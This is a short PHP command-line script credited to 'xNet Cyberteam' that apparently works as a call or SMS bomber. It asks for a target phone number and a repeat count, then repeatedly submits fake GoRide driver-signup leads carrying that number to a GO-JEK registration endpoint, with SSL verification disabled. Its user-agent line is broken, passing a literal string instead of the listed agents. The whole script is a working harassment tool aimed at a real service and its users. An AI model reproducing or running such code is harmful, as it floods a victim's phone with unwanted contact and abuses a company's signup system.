<?php
$agents = array("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36");
function tokcall($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://daftar.go-ride.co.id/supply/app/goride/v1/leads");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"utf8=%E2%9C%93&authenticity_token=5PISU8S0WkvT3pX9YPbW1kMYB8GfRPhk30De61YhYlwOODqpeXVUnSAwcd5udPe21qhNFwS2MUPhUNGpwZbrqQ%3D%3D&lead%5Bfirst_name%5D=Maulana&lead%5Blast_name%5D=Maulana&lead%5Bemail%5D=maulana.hahaha%40gmail.com&lead%5Bcontact_no%5D=".$no."&lead%5Bcity%5D=3&lead%5Bterms_of_service%5D=1");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, '$.agents.');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
print "+-+-+-+-+ +-+-+-+-+    [ From GO-JEK ]
|x|N|e|t| |T|E|A|M|   Code By : xNet
+-+-+-+-+ +-+-+-+-+   Thanks  : xNet Cyberteam
                                  
\n";
echo "Nomor (ex : 87788....) Input : ";
$nomor = trim(fgets(STDIN));
echo "Submit Input : ";
$jumlah = trim(fgets(STDIN));
echo "Delay 0-999 (ex:5) Input : ";
$wait = trim(fgets(STDIN));
$execute = tokcall($nomor, $jumlah, $wait);
print "Success\n";
print "Kalo Gak Sukses Tunggu Beberapa Menit!\n";
?>
